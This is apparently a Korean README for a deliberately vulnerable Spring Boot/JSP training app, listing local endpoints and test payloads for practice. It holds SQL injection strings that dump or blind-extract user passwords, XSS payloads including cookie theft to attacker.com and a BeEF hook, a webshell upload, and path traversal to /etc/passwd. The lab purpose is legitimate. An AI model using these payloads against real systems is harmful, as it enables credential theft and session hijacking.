# VulnSpringApp — 취약점 테스트 환경

Java Spring Boot + JSP 기반 의도적 취약 웹 애플리케이션
`.do` URL 구조, JSESSIONID 쿠키 등 실제 레거시 공공기관 사이트와 유사하게 구성

---

## 실행 방법

### 사전 요구사항
- Java 11 이상
- Maven 3.6 이상

```bash
# PATH 설정
export PATH="/usr/local/bin:$PATH"

# 프로젝트 디렉토리 이동
cd /Users/jesper._.ch/security/Study/VulnSpringApp

# 빌드 및 실행
mvn spring-boot:run
```

### 접속 URL
| 페이지 | URL |
|---|---|
| 메인 | http://localhost:8082/nas/main/main.do |
| 메인 (실제 사이트 형태) | http://localhost:8082/nas/main/main.do?extendedParam=sitdId=nas |
| H2 DB 콘솔 | http://localhost:8082/nas/h2-console |

H2 콘솔 접속: JDBC URL = `jdbc:h2:mem:vulndb`, 사용자 = `sa`, 비밀번호 = 없음

---

## 취약점 및 테스트 페이로드

### 1. SQL Injection

#### SQLi-1: 키워드 검색 (LIKE 절)
```
GET /nas/search/search.do?keyword=<PAYLOAD>
```
| 목적 | 페이로드 |
|---|---|
| 취약점 확인 | `'` |
| 전체 조회 | `' OR '1'='1` |
| 사용자 정보 탈취 | `' UNION SELECT username,password,role,email,id FROM users-- ` |
| 테이블 열거 | `' AND 1=2 UNION SELECT table_name,null,null,null,null FROM information_schema.tables-- ` |

#### SQLi-2: 문서 상세 (숫자형 파라미터)
```
GET /nas/doc/docDetail.do?docId=<PAYLOAD>
```
| 목적 | 페이로드 |
|---|---|
| 전체 조회 | `1 OR 1=1` |
| 사용자 덤프 | `1 UNION SELECT id,username,password,role,email FROM users` |
| 관리자만 | `0 UNION SELECT id,username,password,role,email FROM users WHERE role='ADMIN'` |

#### SQLi-3: 사용자 조회 (Blind SQLi)
```
GET /nas/user/userInfo.do?userId=<PAYLOAD>
```
| 목적 | 페이로드 |
|---|---|
| TRUE 조건 | `admin' AND '1'='1` |
| FALSE 조건 | `admin' AND '1'='2` |
| 비밀번호 첫 글자 확인 | `admin' AND SUBSTRING(password,1,1)='a` |
| 비밀번호 두 번째 글자 | `admin' AND SUBSTRING(password,2,1)='d` |

### 2. XSS

#### XSS-3: Reflected (공지사항)
```
GET /nas/board/notice.do?msg=<PAYLOAD>
```
| 페이로드 | 설명 |
|---|---|
| `<script>alert(document.cookie)</script>` | 쿠키 노출 |
| `<img src=x onerror=alert(1)>` | img 이벤트 |
| `<svg/onload=alert(1)>` | SVG |

#### XSS-1/2: Stored (게시판)
```
POST /nas/board/boardWrite.do
content=<PAYLOAD>
```
| 페이로드 | 설명 |
|---|---|
| `<script>alert('StoredXSS')</script>` | 기본 |
| `<script>new Image().src="http://attacker.com/steal?c="+btoa(document.cookie)</script>` | 쿠키 탈취 |
| `<script src="http://attacker.com:3000/hook.js"></script>` | BeEF 훅 |

### 3. 파일 업로드 / Path Traversal

#### 파일 업로드 (확장자 무제한)
```
POST /nas/file/uploadProc.do
multipart: file = webshell.txt
```

#### Path Traversal — 파일 뷰어
```
GET /nas/file/view.do?fileName=<PAYLOAD>
GET /nas/file/download.do?path=<PAYLOAD>
```
| 페이로드 | 설명 |
|---|---|
| `../../../etc/passwd` | Linux 계정 파일 |
| `../../../etc/hosts` | 호스트 파일 |
| `../../src/main/resources/application.properties` | DB 설정 파일 |
| `../../pom.xml` | 프로젝트 구조 |

---

## DB 초기 데이터

### users 테이블
| id | username | password | role |
|---|---|---|---|
| 1 | admin | admin1234 | ADMIN |
| 2 | hong | hong1234 | USER |
| 3 | kim | kim5678 | USER |
| 4 | lee | lee9999 | USER |

### documents 테이블 (id: 1~4)
### board 테이블 (id: 1~2)
